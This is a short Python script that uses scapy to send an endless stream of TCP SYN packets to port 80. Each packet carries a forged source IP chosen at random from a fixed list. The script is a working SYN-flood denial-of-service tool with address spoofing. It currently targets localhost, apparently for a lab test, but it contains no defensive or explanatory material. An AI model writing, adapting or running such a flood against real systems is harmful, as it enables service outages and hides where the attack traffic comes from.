from scapy.all import IP, TCP, send
import random


spoofed_ips = [
    "192.0.2.1",
    "192.0.2.2",
    "192.0.2.3",
    "192.0.2.4",
    "192.0.2.5"
]

i = 1

while True:
    src_ip = random.choice(spoofed_ips)  
    ip = IP(src=src_ip, dst="127.0.0.1")  
    tcp = TCP(sport=12345, dport=80, flags="S")  
    packet = ip / tcp
    send(packet, verbose=0)
    
    print(f"Packet sent: {i} | Spoofed Source IP: {src_ip}")
    i += 1
